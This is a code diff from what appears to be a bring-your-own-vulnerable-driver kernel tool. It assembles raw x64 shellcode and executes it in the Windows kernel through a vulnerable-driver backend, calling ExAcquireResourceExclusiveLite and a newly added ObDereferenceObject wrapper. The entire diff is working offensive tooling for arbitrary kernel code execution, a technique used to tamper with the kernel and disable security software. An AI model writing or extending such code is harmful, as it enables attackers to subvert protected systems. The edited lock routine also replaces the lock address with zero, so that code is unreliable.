@@ -253,6 +253,8 @@ bool AcquireKernelLock(byovd::IByovdBackend* backend, uint64_t lockAddress, int 
     sc.insert(sc.end(), { 0x48, 0x89, 0xCB });
     // mov rcx, [rbx]        ; lock address
     sc.insert(sc.end(), { 0x48, 0x8B, 0x0B });
+    // mov rdx, 0            ; Wait = FALSE
+    sc.insert(sc.end(), { 0x48, 0x31, 0xD2 });
     // mov rax, [rbx+0x08]   ; lock function
     sc.insert(sc.end(), { 0x48, 0x8B, 0x43, 0x08 });
     // sub rsp, 0x28
@@ -261,18 +263,24 @@ bool AcquireKernelLock(byovd::IByovdBackend* backend, uint64_t lockAddress, int 
     sc.insert(sc.end(), { 0xFF, 0xD0 });
     // add rsp, 0x28
     sc.insert(sc.end(), { 0x48, 0x81, 0xC4, 0x28, 0x00, 0x00, 0x00 });
+    // mov [rbx], rax        ; store BOOLEAN result at ctx[0]
+    sc.insert(sc.end(), { 0x48, 0x89, 0x03 });
     // pop rbx
     sc.insert(sc.end(), { 0x5B });
     // ret
     sc.push_back(0xC3);
 
     ContextBuilder buildCtx = [lockAddress, func](uint64_t base) {
-        uint64_t data[2] = { lockAddress, func };
+        uint64_t data[2] = { 0, func };
         return std::vector<uint8_t>(reinterpret_cast<uint8_t*>(data),
                                     reinterpret_cast<uint8_t*>(data) + sizeof(data));
     };
 
-    return ExecuteKernelShellcodeSmapSafe(backend, sc, buildCtx, nullptr);
+    uint64_t result = 0;
+    if (!ExecuteKernelShellcodeSmapSafe(backend, sc, buildCtx, &result)) {
+        return false;
+    }
+    return result != 0; // BOOLEAN return from ExAcquireResourceExclusiveLite
 }
 
 bool ReleaseKernelLock(byovd::IByovdBackend* backend, uint64_t lockAddress, int type) {
@@ -810,6 +818,58 @@ uint64_t GetDriverObject(byovd::IByovdBackend* backend, const wchar_t* driverNam
     }
 
     return result;
+}
+
+// ---------------------------------------------------------------------------
+// Decrement reference count on a kernel object
+// ---------------------------------------------------------------------------
+
+bool DereferenceObject(byovd::IByovdBackend* backend, uint64_t objectAddress) {
+    if (!backend || !objectAddress) return false;
+
+    uint64_t obDeref = ResolveKernelExport(backend, L"ntoskrnl.exe", "ObDereferenceObject");
+    if (!obDeref) {
+        std::cerr << "[hinv::kmem] ObDereferenceObject not found\n";
+        return false;
+    }
+
+    std::vector<uint8_t> sc;
+    auto PushU64 = [&](uint64_t v) {
+        for (int i = 0; i < 8; ++i) sc.push_back(static_cast<uint8_t>(v >> (i * 8)));
+    };
+
+    // movabs rcx, 0 (patched -> ctxBase)
+    sc.insert(sc.end(), { 0x48, 0xB9 });
+    PushU64(0);
+    // movabs rdx, 0
+    sc.insert(sc.end(), { 0x48, 0xBA });
+    PushU64(0);
+    // push rbx
+    sc.insert(sc.end(), { 0x53 });
+    // mov rbx, rcx
+    sc.insert(sc.end(), { 0x48, 0x89, 0xCB });
+    // mov rcx, [rbx]        ; object address
+    sc.insert(sc.end(), { 0x48, 0x8B, 0x0B });
+    // mov rax, [rbx+0x08]   ; ObDereferenceObject
+    sc.insert(sc.end(), { 0x48, 0x8B, 0x43, 0x08 });
+    // sub rsp, 0x28
+    sc.insert(sc.end(), { 0x48, 0x81, 0xEC, 0x28, 0x00, 0x00, 0x00 });
+    // call rax
+    sc.insert(sc.end(), { 0xFF, 0xD0 });
+    // add rsp, 0x28
+    sc.insert(sc.end(), { 0x48, 0x81, 0xC4, 0x28, 0x00, 0x00, 0x00 });
+    // pop rbx
+    sc.insert(sc.end(), { 0x5B });
+    // ret
+    sc.push_back(0xC3);
+
+    ContextBuilder buildCtx = [objectAddress, obDeref](uint64_t base) {
+        uint64_t data[2] = { objectAddress, obDeref };
+        return std::vector<uint8_t>(reinterpret_cast<uint8_t*>(data),
+                                    reinterpret_cast<uint8_t*>(data) + sizeof(data));
+    };
+
+    return ExecuteKernelShellcodeSmapSafe(backend, sc, buildCtx, nullptr);
 }
 
 // ---------------------------------------------------------------------------
